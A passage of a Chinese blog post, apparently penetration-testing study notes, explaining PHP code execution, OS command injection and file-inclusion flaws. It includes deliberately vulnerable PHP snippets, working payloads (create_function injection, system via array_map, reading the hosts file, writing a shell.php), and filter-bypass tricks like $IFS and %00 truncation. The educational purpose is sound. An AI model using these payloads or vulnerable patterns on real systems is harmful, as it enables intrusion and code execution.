+<p>5.create_function函数:<br>create_function函数根据传递的参数创建匿名函数，并为该匿名函数返回唯一的名称<br>函数语法:<code>string create_function(string $arges , string $code)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">$code&#x3D;&#39;echo&#39;.$func.&#39;test&#39;.$id.&#39;.&#39;;</span><br><span class="line"></span><br><span class="line">create_function(&#39;$func&#39;,$code);</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<p>create_function函数会创建虚拟函数转变成如下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">function func($func)&#123;</span><br><span class="line">  echo &quot;test&quot;.$id;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<p> 当id传入<code>1;&#125;phpinfo();/*</code>时 就可以造成代码执行</p>
+<p>6.array_map函数：<br>array_map函数为数组的每个元素应用回调函数<br><code>函数语法:array array_map(callable $callback,array $array[,array $array2…])</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $func&#x3D;$_GET[&#39;func&#39;];</span><br><span class="line"> $argv&#x3D;$_GET[&#39;argv&#39;];</span><br><span class="line">  $array[0]&#x3D;$argv;</span><br><span class="line">  array_map($func,$array);</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<p>输入<code>func=system&amp;argv=net user</code>为payload后可得到<code>system(net user)</code></p>
+<p>7.preg_replace函数：<br>preg_replace函数执行一个正则表达式的搜索和替换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法:mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+<p>上述语法为搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$subject&#x3D;&quot;hello hack&quot;;</span><br><span class="line">$pattern&#x3D;&#39;&#x2F;hack&#x2F;&#39;;</span><br><span class="line">$replacement&#x3D;$_GET[&quot;name&quot;];</span><br><span class="line">echo preg_replace($pattern,$replacement,$subject)</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<p>输入name为<code>007</code>时，函数执行结果为：<code>hello 007</code></p>
+<h1 id="九、OS命令注入基础及权限深化"><a href="#九、OS命令注入基础及权限深化" class="headerlink" title="九、OS命令注入基础及权限深化"></a>九、OS命令注入基础及权限深化</h1><h2 id="简述-1"><a href="#简述-1" class="headerlink" title="简述"></a>简述</h2><p>命令注⼊是⼀种通过存在漏洞的应⽤程序向主机操作系统执⾏任意命令。当应⽤程序对⽤⼾提供的数据（表单，cookie，http 头）不进⾏检测传递给系统 shell，那么就有可能存在命令注⼊。在这种攻击中，攻击者提供的操作 系统命令通常以易受攻击的应⽤程序的特权执⾏。主要原因是输⼊验证不⾜导致命令注⼊攻击。</p>
+<h2 id="命令注入常用符号"><a href="#命令注入常用符号" class="headerlink" title="命令注入常用符号"></a>命令注入常用符号</h2><p>&amp;&amp;：语法格式如下：<br><code>command1 &amp;&amp; command2 [&amp;&amp; command3 ...]</code><br>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。<br>只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。</p>
+<p>| ：表示管道，上一条命令的输出，作为下一条命令的参数</p>
+<p>||：语法格式如下：<br><code>command1 || command2 [|| command3 ...]</code><br>命令之间使用 || 连接，实现逻辑或的功能。<br>只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。</p>
+<p>&amp;：表示将任务置于后台执行</p>
+<p>；(分号)多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</p>
+<h2 id="服务端相关危险函数："><a href="#服务端相关危险函数：" class="headerlink" title="服务端相关危险函数："></a>服务端相关危险函数：</h2><p>1.system()<br>system() 能够将字符串作为OS 命令执行，自带输出功能</p>
+<p>2.exec()<br>exec() 函数能将字符串作为OS命令执行，需要输出执行结果。测试代码如下</p>
+<p>3.shell_exec()<br>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+<p>4.passthru()<br>执行外部程序并且显示原始输出</p>
+<p>5.popen()<br>popen() 也能执行OS 命令，但是该函数并不是返回命令结果，而是返回一个文件指针。无论返回什么，我们呢关心的是命令执行了</p>
+<p>6.反引号<br>反引号[``] 内的字符串，也会解析成OS 命令</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查看系统文件：<br>提交参数<code>[?cmd=type c:\windows\system32\drivers\etc\hosts]</code>,查看系统hosts 文件。</p>
+<p>显示当前路径：<br>提交参数<code>[?cmd=cd]</code></p>
+<p>写文件：<br>提交参数<code>[?cmd=echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; c:\phpStudy\WWW\Commandi\shell.php]</code><br>页面没有报错，说明写入文件成功。访问shell.php 文件</p>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>尽量减少命令执行函数的使用，并在disable_functions 中禁用</p>
+<p>在进入命令执行的函数或方法之前，对参数进行过滤</p>
+<p>参数的值尽量使用引号包裹，并在拼接前调用addslashes 进行转义</p>
+<h2 id="命令注入绕过方式"><a href="#命令注入绕过方式" class="headerlink" title="命令注入绕过方式"></a>命令注入绕过方式</h2><p>绕过空格：<br>使用<br><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等</code>代替空格。<br>注：IFS的默认值为：空白</p>
+<p>黑名单关键字过滤绕过：<br>使用<code>$*</code>和<code>$@</code>，<code>$x(x代表1-9),$&#123;x&#125;(x&gt;=10)</code><br>注：因为在没有传参的情况下，上面的特殊变量都是为空的<br>使用反斜杠<br>使用变量<br>编码绕过</p>
+<p>绕过长度限制：<br>文件构造</p>
+<h1 id="十、文件包含利用：远程-本地"><a href="#十、文件包含利用：远程-本地" class="headerlink" title="十、文件包含利用：远程-本地"></a>十、文件包含利用：远程-本地</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间，但是也有很多安全隐患。<br>文件包含函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require()&#x2F;&#x2F;出现错误的时候，会直接报错并退出程序的执行。</span><br><span class="line">require_once()&#x2F;&#x2F;出现错误的时候，会直接报错并退出程序的执行，只包括一次。</span><br><span class="line">include()&#x2F;&#x2F;出现错误，会抛出一个警告，程序继续正常运行。</span><br><span class="line">include_once()&#x2F;&#x2F;出现错误，会抛出一个警告，程序继续正常运行，只包括一次。</span><br></pre></td></tr></table></figure>
+<p>漏洞产生原因<br>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。<br>示例代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><h3 id="无限制本地文件包含漏洞"><a href="#无限制本地文件包含漏洞" class="headerlink" title="无限制本地文件包含漏洞"></a>无限制本地文件包含漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以无限制的访问服务器的其他文件。</p>
+<h3 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h3><p>利用条件：<br>session位置可以获取<br>可通过phpinfo（session.save_path）获取位置，得不到phpinfo时也可以猜测（linux下session位置默认为/var/lib/php/session目录下）。<br>实例代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();&#x2F;&#x2F;启动新会话或者重用现有会话</span><br><span class="line">$ctfs&#x3D;$_GET[&#39;ctfs&#39;];</span><br><span class="line">$_SESSION[&quot;username&quot;]&#x3D;$ctfs;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>此php会将获取到的GET型ctfs变量的值存入到session中。<br>可以通过向ctfs写入恶意php脚本来getshell。</p>
+<h3 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h3><p>绕过方法1：%00 截断<br>条件：magic_quotes_gpc = Off PHP 版本&lt;5.3.4<br>测试：<code>？filename=../../../../../../boot.ini%00</code><br>绕过方法2：路径长度截断<br>条件：<br>windows下目录路径最大长度为256字节，超出部分将丢弃；<br>Linux下目录最大长度为4096字节，超出长度将丢弃<br>测试：<code>?filename=text.txt././././.  或?filename=test.txt.....</code></p>
+<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>前提：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On（是否允许打开远程文件）</span><br><span class="line">allow_url_include &#x3D; On（是否允许include&#x2F;require远程文件）</span><br></pre></td></tr></table></figure>
+<p>无限制与本地基本一致</p>
+<p>有限制：可以用？ #  空格等绕过。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/03/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A09%EF%BC%9ACMS%E6%B8%97%E9%80%8F/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2021-03-17 18:37:06
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/03/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A011%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E4%BA%8Ephpmyadmin%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-text">一、基于phpmyadmin的攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E5%AF%BB%E6%89%BE"><span class="toc-text">入口寻找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E5%88%A4%E6%96%AD"><span class="toc-text">版本判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-text">登录口令爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">万能密码漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84"><span class="toc-text">获取物理路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E8%8E%B7%E5%8F%96shell"><span class="toc-text">常用方法获取shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97getshell"><span class="toc-text">日志getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAshell"><span class="toc-text">导出shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81phpinfo%E9%A1%B5%E9%9D%A2%E5%B1%95%E5%BC%80%E7%9A%84%E6%B8%97%E9%80%8F"><span class="toc-text">二、phpinfo页面展开的渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96phpinfo%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">获取phpinfo的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-text">phpinfo存在的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-functions"><span class="toc-text">绕过disable_functions</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E6%B3%95"><span class="toc-text">黑名单绕过法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-text">系统组件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageMagick%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">ImageMagick漏洞绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87open-basedir"><span class="toc-text">绕过open_basedir</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E5%B1%95%E5%BC%80%E7%9A%84%E6%B8%97%E9%80%8F"><span class="toc-text">三、基于网站备份展开的渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD"><span class="toc-text">怎么获取网站备份</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E5%9C%A8%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8"><span class="toc-text">网站备份在渗透过程中有什么用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%90%84%E7%B1%BB%E6%8B%96%EF%BC%88%E8%84%B1%EF%BC%89%E5%BA%93%E6%96%B9%E6%B3%95"><span class="toc-text">四、各类拖（脱）库方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0"><span class="toc-text">简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%8B%96%E5%BA%93"><span class="toc-text">注入点拖库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96webshell%E6%83%85%E5%86%B5%E7%9A%84%E6%8B%96%E5%BA%93"><span class="toc-text">获取webshell情况的拖库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81HTTP%E8%AF%B7%E6%B1%82%E6%BA%90IP%E4%BC%AA%E9%80%A0"><span class="toc-text">五、HTTP请求源IP伪造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81Github%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8"><span class="toc-text">六、Github信息泄露利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B7%B1%E5%8C%96"><span class="toc-text">七、文件下载漏洞的深化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">八、PHP代码执行漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%8F%8A%E6%9D%83%E9%99%90%E6%B7%B1%E5%8C%96"><span class="toc-text">九、OS命令注入基础及权限深化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-1"><span class="toc-text">简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7"><span class="toc-text">命令注入常用符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9B%B8%E5%85%B3%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-text">服务端相关危险函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-text">防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">命令注入绕过方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%9A%E8%BF%9C%E7%A8%8B-%E6%9C%AC%E5%9C%B0"><span class="toc-text">十、文件包含利用：远程-本地</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">无限制本地文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">session文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">有限制本地文件包含漏洞绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">远程文件包含漏洞</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
